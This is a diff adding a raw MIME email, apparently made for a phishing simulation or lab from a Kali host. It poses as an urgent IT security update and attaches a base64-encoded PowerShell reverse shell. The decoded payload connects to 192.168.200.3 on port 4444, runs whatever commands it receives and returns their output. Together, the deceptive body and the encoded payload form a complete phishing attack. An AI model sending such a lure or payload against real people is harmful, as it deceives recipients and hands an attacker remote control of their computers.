@@ -1,0 +1,38 @@
+Date: Sun, 07 Jun 2026 08:16:01 -0400
+To: mailnet1@company.com
+From: mailnet1@kali.local
+Subject: URGENT: Security Update Required - Multiple Documents
+Message-Id: <20260607081601.005358@kali>
+X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_5358"
+
+------=_MIME_BOUNDARY_000_5358
+Content-Type: text/plain
+
+Dear Team,
+
+Please review the attached documents and software updates as soon as possible.
+
+Attachments include:
+
+Regards,
+IT Security Team
+------=_MIME_BOUNDARY_000_5358
+Content-Type: application/octet-stream; name="encoded_payload.txt"
+Content-Description: encoded_payload.txt
+Content-Disposition: attachment; filename="encoded_payload.txt"
+Content-Transfer-Encoding: BASE64
+
+cG93ZXJzaGVsbCAtQyAiJGM9TmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50
+KCcxOTIuMTY4LjIwMC4zJyw0NDQ0KTskcz0kYy5HZXRTdHJlYW0oKTtbYnl0ZVtdXSRiPTAuLjY1
+NTM1fCV7MH07d2hpbGUoKCRpPSRzLlJlYWQoJGIsMCwkYi5MZW5ndGgpKSAtbmUgMCl7OyRkPShO
+ZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmco
+JGIsMCwkaSk7JHNlbmRiYWNrPShpZXggJGQgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2sy
+PSRzZW5kYmFjaysiUFMgIiArKHB3ZCkuUGF0aCsiPiAiOyRzZW5kYnl0ZT0oW3RleHQuZW5jb2Rp
+bmddOjpBU0NJKS5HZXRCeXRlcygkc2VuZGJhY2syKTskcy5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2Vu
+ZGJ5dGUuTGVuZ3RoKTskcy5GbHVzaCgpfTskYy5DbG9zZSgpIg==
+
+------=_MIME_BOUNDARY_000_5358--
+
+
